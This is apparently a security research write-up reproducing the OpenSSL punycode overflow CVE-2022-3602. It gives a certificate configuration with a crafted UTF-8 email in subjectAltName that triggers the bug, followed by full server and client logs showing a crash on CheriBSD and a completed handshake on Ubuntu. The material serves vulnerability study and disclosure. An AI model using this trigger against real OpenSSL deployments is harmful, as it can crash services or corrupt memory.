# OpenSSL punny_code vulnerability CVE-2022-3602

The client send a UTF encode web address encoded in the certificate as follows:
```
basicConstraints        = critical,CA:false
subjectKeyIdentifier    = hash
authorityKeyIdentifier  = keyid,issuer
nsCertType              = client, email
keyUsage                = critical, nonRepudiation, digitalSignature, keyEncipherment
extendedKeyUsage        = clientAuth, emailProtection

# Need to define subjectAltName with otherName
subjectAltName          = @alts
[alts]
otherName = 1.3.6.1.5.5.7.8.9;FORMAT:UTF8,UTF8String:测试@overflow.com
```

## Run on CheriBSD

OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2 15 Mar 2022)

### Server run
```console
cheribsd$ openssl s_server -accept 3000 -CAfile certs/cacert.pem -cert certs/server.cert.pem -key certs/server.key.pem  -state -verify 1

verify depth is 1
Using default temp DH parameters
ACCEPT
SSL_accept:before SSL initialization
SSL_accept:before SSL initialization
SSL_accept:SSLv3/TLS read client hello
SSL_accept:SSLv3/TLS write server hello
SSL_accept:SSLv3/TLS write change cipher spec
SSL_accept:TLSv1.3 write encrypted extensions
SSL_accept:SSLv3/TLS write certificate request
SSL_accept:SSLv3/TLS write certificate
SSL_accept:TLSv1.3 write server certificate verify
SSL_accept:SSLv3/TLS write finished
SSL_accept:TLSv1.3 early data
SSL3 alert write:fatal:decode error
SSL_accept:error in error
ERROR
00002641000000000000D04900405DDC:error:0A000126:SSL routines:ssl3_read_n:unexpected eof while reading:ssl/record/rec_layer_s3.c:309:
shutting down SSL
CONNECTION CLOSED
```

### Client run
```console
cheribsd$ openssl s_client -connect 127.0.0.1:3000 -key certs/client.key.pem  -cert certs/client.cert.pem -CAfile certs/cacert.pem -state

CONNECTED(00000003)
SSL_connect:before SSL initialization
SSL_connect:SSLv3/TLS write client hello
SSL_connect:SSLv3/TLS write client hello
SSL_connect:SSLv3/TLS read server hello
Can't use SSL_get_servername
SSL_connect:TLSv1.3 read encrypted extensions
SSL_connect:SSLv3/TLS read server certificate request
depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
verify error:num=19:self-signed certificate in certificate chain
verify return:1
depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
verify return:1
depth=0 C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server
verify return:1
SSL_connect:SSLv3/TLS read server certificate
SSL_connect:TLSv1.3 read server certificate verify
SSL_connect:SSLv3/TLS read finished
SSL_connect:SSLv3/TLS write change cipher spec
In-address space security exception (core dumped)
```

## Run on Ubuntu 22.04

OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2 15 Mar 2022)

### Server run

```console
cheribsd$ openssl s_server -accept 3000 -CAfile certs/cacert.pem -cert certs/server.cert.pem -key certs/server.key.pem  -state -verify 1

verify depth is 1
Using default temp DH parameters
ACCEPT
SSL_accept:before SSL initialization
SSL_accept:before SSL initialization
SSL_accept:SSLv3/TLS read client hello
SSL_accept:SSLv3/TLS write server hello
SSL_accept:SSLv3/TLS write change cipher spec
SSL_accept:TLSv1.3 write encrypted extensions
SSL_accept:SSLv3/TLS write certificate request
SSL_accept:SSLv3/TLS write certificate
SSL_accept:TLSv1.3 write server certificate verify
SSL_accept:SSLv3/TLS write finished
SSL_accept:TLSv1.3 early data
SSL_accept:TLSv1.3 early data
depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert
verify error:num=19:self-signed certificate in certificate chain
verify return:1
depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert
verify return:1
depth=0 C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert
verify return:1
depth=0 C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert
verify error:num=1:unspecified certificate verification error
verify return:1
SSL_accept:SSLv3/TLS read client certificate
SSL_accept:SSLv3/TLS read certificate verify
SSL_accept:SSLv3/TLS read finished
SSL_accept:SSLv3/TLS write session ticket
SSL_accept:SSLv3/TLS write session ticket
-----BEGIN SSL SESSION PARAMETERS-----
MIIEngIBAQICAwQEAhMCBCBZCpXVE2SE4A+3H8VW9z6ollM1DPOJUHcYHRHkkNhR
ugQwrdjh4uxZn1pdQoDXH9umEvFkoxQmD4Mvtvkgr5GhluwsaAIISI1CrIEggy67
ZQa1oQYCBGNj8FaiBAICHCCjggQTMIIEDzCCAvegAwIBAgIBATANBgkqhkiG9w0B
AQsFADBsMQswCQYDVQQGEwJGUjEMMAoGA1UECAwDSWRGMQ4wDAYDVQQHDAVQYXJp
czEQMA4GA1UECgwHRGF0YURvZzEZMBcGA1UECwwQU2VjdXJpdHlSZXNlYXJjaDES
MBAGA1UEAwwJS3JhZnRDZXJ0MB4XDTIyMTEwMzE2Mjk1NFoXDTI3MDUxMTE2Mjk1
NFowZjELMAkGA1UEBhMCRlIxDDAKBgNVBAgMA0lkRjEQMA4GA1UECgwHRGF0YURv
ZzEZMBcGA1UECwwQU2VjdXJpdHlSZXNlYXJjaDEcMBoGA1UEAwwTTWFsaWNpb3Vz
Q2xpZW50Q2VydDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJTHbSv7
gYkaKsr1g6lHkH4n5VBnkJdWmnJJF8LdJSqOU19x7M2MyqpkOR1M02oPHUCBRMea
b7MOdmOdpjlJqpoMUFZEbJ+RAjXaulFGXolOBEurICKdIzOeMkKDg86h1KRFGfOu
oqeXqzrHP+8O0QJo56ix6UGG7rctFnOgVRw0oHZJz7Vt8bxwpkxfQs80Xy+tKpF1
rZUnSXDRSSzkK1FBBi8IL+xoIhDSA/mjkEfyqaqL7Ei6Xxps0RjKVyIUoZkABt/y
0WGniKxEGYiR/FkWj7nPRf4GN5IleTESNurR67OdUs4U0X2BY4K8xMRJ2X1LW3dC
gQhh64S5sIBcL68CAwEAAaOBwTCBvjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBSP
2ZN8regCCMr4IjnS9xvzbC7znzAfBgNVHSMEGDAWgBQxM5wQHAAQUWd6GQWZ6VZ1
2tuXNzARBglghkgBhvhCAQEEBAMCBaAwDgYDVR0PAQH/BAQDAgXgMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDBDAsBgNVHREEJTAjoCEGCCsGAQUFBwgJoBUM
E+a1i+ivlUBvdmVyZmxvdy5jb20wDQYJKoZIhvcNAQELBQADggEBAA/rHrskROMS
9rCqxr+/BVIuYdj5G9FzckXmigUS1MccjuAP9Wnb4/8ATMfmpCM7WGjI++0Z0u7Q
8Kxhwz8qnz3cVXzIzJB8LnaiFIKiiLI4RxcHRBQWHtuKhj73b47OsyjlZLviz1k8
YZmoVzcIaIqv22fwiTfWn6slmUBxuCgOEqAUo0LVaqaP6N5yxOrbZ+7NvvChXu/R
zayhJFqfEzUPyyYolYc+YseSmeoz8OAy78TNSctbeH0PuNf1KPZjNABD0PiszPzI
d/dN/J8cteaHlLndQgMYJi4f8SU4OjnWhVSojPoeYY5LLNYSmPjSlIW4Sgj5FGOe
BuhwKBH1/wykBgQEAQAAAKUDAgEBrgYCBGOC4hazAwIBHQ==
-----END SSL SESSION PARAMETERS-----
Client certificate
-----BEGIN CERTIFICATE-----
MIIEDzCCAvegAwIBAgIBATANBgkqhkiG9w0BAQsFADBsMQswCQYDVQQGEwJGUjEM
MAoGA1UECAwDSWRGMQ4wDAYDVQQHDAVQYXJpczEQMA4GA1UECgwHRGF0YURvZzEZ
MBcGA1UECwwQU2VjdXJpdHlSZXNlYXJjaDESMBAGA1UEAwwJS3JhZnRDZXJ0MB4X
DTIyMTEwMzE2Mjk1NFoXDTI3MDUxMTE2Mjk1NFowZjELMAkGA1UEBhMCRlIxDDAK
BgNVBAgMA0lkRjEQMA4GA1UECgwHRGF0YURvZzEZMBcGA1UECwwQU2VjdXJpdHlS
ZXNlYXJjaDEcMBoGA1UEAwwTTWFsaWNpb3VzQ2xpZW50Q2VydDCCASIwDQYJKoZI
hvcNAQEBBQADggEPADCCAQoCggEBAJTHbSv7gYkaKsr1g6lHkH4n5VBnkJdWmnJJ
F8LdJSqOU19x7M2MyqpkOR1M02oPHUCBRMeab7MOdmOdpjlJqpoMUFZEbJ+RAjXa
ulFGXolOBEurICKdIzOeMkKDg86h1KRFGfOuoqeXqzrHP+8O0QJo56ix6UGG7rct
FnOgVRw0oHZJz7Vt8bxwpkxfQs80Xy+tKpF1rZUnSXDRSSzkK1FBBi8IL+xoIhDS
A/mjkEfyqaqL7Ei6Xxps0RjKVyIUoZkABt/y0WGniKxEGYiR/FkWj7nPRf4GN5Il
eTESNurR67OdUs4U0X2BY4K8xMRJ2X1LW3dCgQhh64S5sIBcL68CAwEAAaOBwTCB
vjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBSP2ZN8regCCMr4IjnS9xvzbC7znzAf
BgNVHSMEGDAWgBQxM5wQHAAQUWd6GQWZ6VZ12tuXNzARBglghkgBhvhCAQEEBAMC
BaAwDgYDVR0PAQH/BAQDAgXgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
BDAsBgNVHREEJTAjoCEGCCsGAQUFBwgJoBUME+a1i+ivlUBvdmVyZmxvdy5jb20w
DQYJKoZIhvcNAQELBQADggEBAA/rHrskROMS9rCqxr+/BVIuYdj5G9FzckXmigUS
1MccjuAP9Wnb4/8ATMfmpCM7WGjI++0Z0u7Q8Kxhwz8qnz3cVXzIzJB8LnaiFIKi
iLI4RxcHRBQWHtuKhj73b47OsyjlZLviz1k8YZmoVzcIaIqv22fwiTfWn6slmUBx
uCgOEqAUo0LVaqaP6N5yxOrbZ+7NvvChXu/RzayhJFqfEzUPyyYolYc+YseSmeoz
8OAy78TNSctbeH0PuNf1KPZjNABD0PiszPzId/dN/J8cteaHlLndQgMYJi4f8SU4
OjnWhVSojPoeYY5LLNYSmPjSlIW4Sgj5FGOeBuhwKBH1/ww=
-----END CERTIFICATE-----
subject=C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert
issuer=C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert
Shared ciphers:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA
Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224:DSA+SHA224:DSA+SHA256:DSA+SHA384:DSA+SHA512
Shared Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Supported groups: x25519:secp256r1:x448:secp521r1:secp384r1:ffdhe2048:ffdhe3072:ffdhe4096:ffdhe6144:ffdhe8192
Shared groups: x25519:secp256r1:x448:secp521r1:secp384r1:ffdhe2048:ffdhe3072:ffdhe4096:ffdhe6144:ffdhe8192
CIPHER is TLS_AES_256_GCM_SHA384
Secure Renegotiation IS supported
```

### Client run

```console
cheribsd$ openssl s_client -connect 127.0.0.1:3000 -key certs/client.key.pem  -cert certs/client.cert.pem -CAfile certs/cacert.pem -state

CONNECTED(00000003)
SSL_connect:before SSL initialization
SSL_connect:SSLv3/TLS write client hello
SSL_connect:SSLv3/TLS write client hello
SSL_connect:SSLv3/TLS read server hello
Can't use SSL_get_servername
SSL_connect:TLSv1.3 read encrypted extensions
SSL_connect:SSLv3/TLS read server certificate request
depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
verify error:num=19:self-signed certificate in certificate chain
verify return:1
depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
verify return:1
depth=0 C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server
verify return:1
SSL_connect:SSLv3/TLS read server certificate
SSL_connect:TLSv1.3 read server certificate verify
SSL_connect:SSLv3/TLS read finished
SSL_connect:SSLv3/TLS write change cipher spec
SSL_connect:SSLv3/TLS write client certificate
SSL_connect:SSLv3/TLS write certificate verify
SSL_connect:SSLv3/TLS write finished
---
Certificate chain
 0 s:C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server
   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov  3 16:29:59 2022 GMT; NotAfter: May 11 16:29:59 2027 GMT
 1 s:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov  3 16:29:59 2022 GMT; NotAfter: Oct 31 16:29:59 2032 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIBATANBgkqhkiG9w0BAQsFADBmMQswCQYDVQQGEwJVUzEL
MAkGA1UECAwCTlkxDDAKBgNVBAcMA05ZQzEQMA4GA1UECgwHRGF0YURvZzEZMBcG
A1UECwwQU2VjdXJpdHlSZXNlYXJjaDEPMA0GA1UEAwwGUm9vdENBMB4XDTIyMTEw
MzE2Mjk1OVoXDTI3MDUxMTE2Mjk1OVowWDELMAkGA1UEBhMCVVMxCzAJBgNVBAgM
Ak5ZMRAwDgYDVQQKDAdEYXRhRG9nMRkwFwYDVQQLDBBTZWN1cml0eVJlc2VhcmNo
MQ8wDQYDVQQDDAZzZXJ2ZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCleVvV01eS8srJN6J4OorgEvBOZlObRTGC9C7LMBCw3eveGsH1Zsvwu0kVq75u
7skcdrAhcwsNPWbIODTIKsB8+LIO1OFAdpzMVzLS3lUrDvRES43Xfk/msfEGPwuX
8vun+m/BsL7G26GjzMVt20OrNPzClkA7qcXw0FyHL3KIm91QGWIrKD6J+rQ3KkJs
Nr8Dk2+iaNThBsnvKua3KMmAXNPrqk4pHoNTys2/cROtE9mJgfVUu5bMqCP5C2/v
XWRjnok/yonDnrPM+2gIhJmvxL51YXByHS53dkyugt4b37NIMPh32BTiV47Ksusi
FcwYdFeNx4nXoosrvYTb0oIVAgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMB0G
A1UdDgQWBBQosZoWgTI82HJiGK54MpNKtSAjRDCBowYDVR0jBIGbMIGYgBRnqP6j
XaswtXXBsXfGWCr9aXM30qFqpGgwZjELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5Z
MQwwCgYDVQQHDANOWUMxEDAOBgNVBAoMB0RhdGFEb2cxGTAXBgNVBAsMEFNlY3Vy
aXR5UmVzZWFyY2gxDzANBgNVBAMMBlJvb3RDQYIUTJnQLBTVkjOI9slg8ElqXLJh
reIwEQYJYIZIAYb4QgEBBAQDAgZAMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAK
BggrBgEFBQcDATANBgkqhkiG9w0BAQsFAAOCAQEAIBc3sQriGKQ14LUSav/Aq75h
BhxiPx32/b7tJ3l30bjvJEo8F2GmaSYHCs6+3cV89XRoVTqE3io2inz6COArSujF
M6PaioEuOqmodQtih2QINSuj/R0oU2wxFjWobDP0JmjwlUj1u6EyRcQgnuKicAUv
y/HId7oVDctjYS4FlvU2Bmt0Tx8QQx4pSJL3/4kqff8VxpTCryMPMQdcnOv+0Zs1
vq3FCkMPg8oFtxQ90k7ttrJUZjz/H8C686tX9I0agDZYSo729+Ub+ReEdBoDm8Yi
+a9JpqZcL2TP0OK3bPC3pG5ecNcJYPbowSXj9MQ5xq8/opsN07Er8kw28HPMtQ==
-----END CERTIFICATE-----
subject=C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server
issuer=C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
---
Acceptable client certificate CA names
C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224
Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 2787 bytes and written 3277 bytes
Verification error: self-signed certificate in certificate chain
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 19 (self-signed certificate in certificate chain)
---
SSL_connect:SSL negotiation finished successfully
SSL_connect:SSL negotiation finished successfully
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 39965FB4A3FC59E1F1503089F01F4DA9CDDDFA7551D13CA7D8B0E307DD72E642
    Session-ID-ctx: 
    Resumption PSK: 840C043151B5F6ED1AAA962E0882B373BD2287514AB4C31D2753BC1740A3D930EEF3794099ADED2333756228F6B39574
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - d5 7d bf aa 98 87 19 82-a1 39 07 36 c5 67 a2 cb   .}.......9.6.g..
    0010 - 91 92 72 22 85 13 fb 2d-c7 1d 1a 42 18 fe ff 3a   ..r"...-...B...:
    0020 - 4e 38 c0 c0 8f 78 e2 c4-a5 10 5d e5 74 21 2b a0   N8...x....].t!+.
    0030 - 3b 92 02 00 60 21 fd 36-f3 8d 30 a2 5e 07 85 ee   ;...`!.6..0.^...
    0040 - 84 c5 60 b7 09 b5 18 f7-cb 18 1c 75 f4 55 8a 8e   ..`........u.U..
    0050 - 98 08 01 29 f9 5f 17 ef-6a 73 1f a6 bc 8d 1c e1   ...)._..js......
    0060 - da e8 95 e9 55 73 da aa-8f 4e 42 42 74 22 ce d9   ....Us...NBBt"..
    0070 - ea df 99 91 d0 af 07 05-d8 2c 73 a0 f2 ac 02 fe   .........,s.....
    0080 - c8 b4 a4 de 4c 53 08 93-6a be 75 48 e5 16 a2 21   ....LS..j.uH...!
    0090 - 0c 2b d5 92 f6 1a 23 94-30 ed b6 ef 43 29 24 7c   .+....#.0...C)$|
    00a0 - c2 68 b4 0f 44 6a ae be-1b 00 bc b9 ce 72 0f 3f   .h..Dj.......r.?
    00b0 - d9 73 76 30 b6 c4 aa e5-14 59 d0 1b b4 f2 14 92   .sv0.....Y......
    00c0 - 70 10 d6 17 d4 61 d2 d7-a8 a9 f3 e0 31 05 f1 95   p....a......1...
    00d0 - 64 0a 59 63 d3 b4 9c 6b-4e fc b4 c7 39 b5 cb 08   d.Yc...kN...9...
    00e0 - 9c 30 e6 48 0c 29 d4 32-c2 1e e1 da b1 61 06 e9   .0.H.).2.....a..
    00f0 - 41 01 8c b5 f1 e1 21 c7-30 0c ca 4f b4 03 c1 63   A.....!.0..O...c
    0100 - a5 a1 07 fb 9d ec 26 02-24 31 a1 a8 28 81 f6 7c   ......&.$1..(..|
    0110 - df e3 61 d7 fc 89 2f e3-31 86 89 ea 83 d4 03 f1   ..a.../.1.......
    0120 - 48 c5 a3 a4 5d 78 7e c4-e3 78 0a e5 03 e5 e8 5d   H...]x~..x.....]
    0130 - d4 15 42 d3 36 6d dd af-0a 7c d2 62 2e 2b c7 e0   ..B.6m...|.b.+..
    0140 - 08 b7 15 10 60 40 09 53-03 37 53 d1 87 2c 87 7b   ....`@.S.7S..,.{
    0150 - 3a 0b 13 bd ca ee 04 8d-f8 65 2a 9e 42 0f c3 bd   :........e*.B...
    0160 - 33 db c1 1b 87 a2 95 0b-a6 53 b2 cf 0e c4 6d 5f   3........S....m_
    0170 - eb 1c 9c 94 ce 77 5b d5-96 69 fd 4f 41 93 89 b6   .....w[..i.OA...
    0180 - c8 82 c8 fc 46 a7 92 21-b3 45 d4 53 6d bf 8f d7   ....F..!.E.Sm...
    0190 - 2f 37 b7 a4 46 9a a1 22-1d eb a5 27 c2 6f bd 56   /7..F.."...'.o.V
    01a0 - a9 38 89 3c 62 69 e5 d0-0c e8 71 38 72 c5 07 33   .8.<bi....q8r..3
    01b0 - cf ec 04 eb bf 3d 8f b8-d4 d0 71 98 a3 6b c1 63   .....=....q..k.c
    01c0 - 65 ee d0 46 4d c3 18 70-11 b3 42 ab 13 38 b6 e5   e..FM..p..B..8..
    01d0 - d8 3c 93 5c 32 10 b2 16-a3 7f e3 c6 46 51 6e 41   .<.\2.......FQnA
    01e0 - c0 83 72 e8 33 92 90 fd-8e 17 5c 21 0a 00 2c 7a   ..r.3.....\!..,z
    01f0 - 12 d6 0c 26 5f 65 02 bc-21 4f a4 05 43 f7 ff 40   ...&_e..!O..C..@
    0200 - f5 30 e4 23 5e 9f 12 6c-e3 9c bd 2f bd 77 eb 00   .0.#^..l.../.w..
    0210 - e9 f0 1b 9b 6e 32 68 6c-ee 16 bd 9f 46 1d d8 c2   ....n2hl....F...
    0220 - e8 12 64 38 3e 01 ca 3b-8d d3 78 98 20 c8 c9 34   ..d8>..;..x. ..4
    0230 - a4 e7 d6 2a 14 9d ba de-4d f2 3c 9c cb b4 78 e2   ...*....M.<...x.
    0240 - c9 11 8a 25 70 d8 32 7f-90 ce 74 79 35 d4 2e 33   ...%p.2...ty5..3
    0250 - e9 b9 e9 99 70 f9 41 59-0e af 1a 6c 36 75 e5 8e   ....p.AY...l6u..
    0260 - 5a a8 59 3c f4 19 b7 14-26 59 9f 75 8c 7e 1b 83   Z.Y<....&Y.u.~..
    0270 - 9f 31 bb 6d 3b a0 77 9e-00 95 c0 77 27 2f 8c 8b   .1.m;.w....w'/..
    0280 - 83 9b cb 30 b6 ab b0 7b-c4 c9 8b 6b 85 f5 b5 1f   ...0...{...k....
    0290 - 38 32 b0 7d 09 22 aa 56-24 15 a9 51 71 a2 f9 f7   82.}.".V$..Qq...
    02a0 - 30 31 07 a6 15 c1 83 d3-f4 0f 73 38 34 31 1e 9e   01........s841..
    02b0 - 08 41 78 c3 e5 a4 a1 d0-dc b6 23 56 f7 f8 9a a5   .Ax.......#V....
    02c0 - f2 de c2 90 3e 4e 8f 89-7b 0c be 79 15 a5 c5 36   ....>N..{..y...6
    02d0 - d1 13 a0 c5 50 23 a8 d5-06 99 78 4e dc 51 d2 65   ....P#....xN.Q.e
    02e0 - 0b e5 74 da 1b 9d 2f 8f-ad 33 9b 60 b2 2f d2 18   ..t.../..3.`./..
    02f0 - 0c e3 b3 f7 c3 79 0f 40-0f 6d d2 b4 46 54 e1 9f   .....y.@.m..FT..
    0300 - f9 97 82 5a 2c d0 dc 39-d3 1a 06 54 92 bd ef 30   ...Z,..9...T...0
    0310 - af d3 0c 11 2a 91 2d f2-b3 4f 9a cf 25 03 3e 8f   ....*.-..O..%.>.
    0320 - 3d 65 5e 4b 5a 2a ae b0-9b 51 bf 05 37 3f d1 30   =e^KZ*...Q..7?.0
    0330 - f2 66 cf 85 3f ac cb f5-2d 45 90 1f 5d 57 96 d9   .f..?...-E..]W..
    0340 - d8 25 dc db 97 79 43 45-97 cc df bf 07 bc 1c e8   .%...yCE........
    0350 - 74 a7 7d 4e 38 80 6f 0b-84 96 5d c8 04 07 fc 4c   t.}N8.o...]....L
    0360 - 02 80 92 15 60 ef 64 2e-30 9e d7 4c ab 9c 49 43   ....`.d.0..L..IC
    0370 - 0c 09 02 33 d2 66 21 a5-4e 4d 19 99 7f f0 6b 94   ...3.f!.NM....k.
    0380 - f5 87 cb 83 dd e2 df 85-71 84 cf 02 53 17 86 c9   ........q...S...
    0390 - ff 01 40 34 9b e5 f1 ec-70 fa cf a6 a2 3d 47 d8   ..@4....p....=G.
    03a0 - 13 28 e7 a3 2c da 06 77-9c f9 a5 e6 d0 03 3e 0e   .(..,..w......>.
    03b0 - f7 15 b6 a5 37 4e 3c 32-91 f0 75 e4 d1 6e 60 20   ....7N<2..u..n` 
    03c0 - b0 3d 37 82 0e 6b fc df-e2 63 c0 f2 70 b5 77 56   .=7..k...c..p.wV
    03d0 - 78 3b b1 93 df 9a 3d 21-f5 b7 99 ee 20 ab c8 70   x;....=!.... ..p
    03e0 - 19 a5 25 6a e8 fd 09 65-32 5f a1 20 cf d1 2d a6   ..%j...e2_. ..-.
    03f0 - 86 c1 f7 a0 61 a3 ff fd-0c 2d 53 c9 63 22 55 16   ....a....-S.c"U.
    0400 - ed 85 6c 6d 46 15 23 7b-bf 8a fd 1f 58 3f 0a aa   ..lmF.#{....X?..
    0410 - da f8 92 ef 79 9a 95 02-27 60 f2 44 30 11 60 f2   ....y...'`.D0.`.
    0420 - 84 60 ca 7b 24 25 02 73-7e 1e 83 e9 5f 03 43 20   .`.{$%.s~..._.C 
    0430 - 59 75 c8 c5 8c 53 98 36-2e b6 12 eb 11 09 35 76   Yu...S.6......5v
    0440 - 1a c8 fe c4 c5 89 d1 13-2f 8b f1 a0 8e 61 00 71   ......../....a.q
    0450 - c9 8f 1e b2 4e bf 45 f3-a8 94 33 ef 74 f6 1c 33   ....N.E...3.t..3
    0460 - 26 f9 3a 20 0e 95 9e 06-e1 ff db 03 b2 ae 41 d1   &.: ..........A.
    0470 - 71 0a 92 2f d9 72 da 64-7d da f7 c8 fb 77 2a fa   q../.r.d}....w*.
    0480 - d8 77 ed e8 f2 b9 d0 ee-00 47 0a ed 4c 90 da 0b   .w.......G..L...
    0490 - de 8e 2c 62 56 e6 4a 1b-5c 24 45 23 ec f0 51 8e   ..,bV.J.\$E#..Q.
    04a0 - 81 24 fd 22 51 05 eb d8-d6 a8 1a a6 0f 42 c3 82   .$."Q........B..
    04b0 - 30 49 26 ff ae e1 90 a6-81 56 19 4d 70 4f ba e0   0I&......V.MpO..
    04c0 - b1 5d 00 10 8e 1c 9f 87-19 a7 d9 78 b7 9e 7d ec   .].........x..}.
    04d0 - 25 7c 96 31 b1 f1 88 b7-f9 a2 a8 39 32 0d e0 b3   %|.1.......92...
    04e0 - 37 81 d0 bf 61 cb 1b 92-00 6b 4e 0e 59 a7 42 da   7...a....kN.Y.B.

    Start Time: 1667493974
    Timeout   : 7200 (sec)
    Verify return code: 19 (self-signed certificate in certificate chain)
    Extended master secret: no
    Max Early Data: 0
---
SSL_connect:SSLv3/TLS read server session ticket
read R BLOCK
SSL_connect:SSL negotiation finished successfully
SSL_connect:SSL negotiation finished successfully
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: A66E131392583C15CEDD8C0C18BA3C00D6D99BE3F67CFB2FF21C3D22CFEC6DBE
    Session-ID-ctx: 
    Resumption PSK: ADD8E1E2EC599F5A5D4280D71FDBA612F164A314260F832FB6F920AF91A196EC2C680208488D42AC8120832EBB6506B5
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - d5 7d bf aa 98 87 19 82-a1 39 07 36 c5 67 a2 cb   .}.......9.6.g..
    0010 - 69 3b b3 8e 79 8d 2e 93-f7 b7 2a 90 46 4e 5f ff   i;..y.....*.FN_.
    0020 - 40 85 d5 30 ec ea 2e 8d-10 82 c4 26 f9 e9 66 78   @..0.......&..fx
    0030 - 42 83 5d 18 f2 bc e0 6a-a5 f4 e8 23 53 34 e5 6a   B.]....j...#S4.j
    0040 - 78 0d b7 d3 d7 94 7d 2a-9f ad c7 c3 e5 4e aa 9b   x.....}*.....N..
    0050 - 17 c3 3e ad 01 57 78 20-5f f0 07 ad 29 21 83 99   ..>..Wx _...)!..
    0060 - 46 4a 1b bf 65 55 1e 66-25 ce 7b 55 28 74 ab 71   FJ..eU.f%.{U(t.q
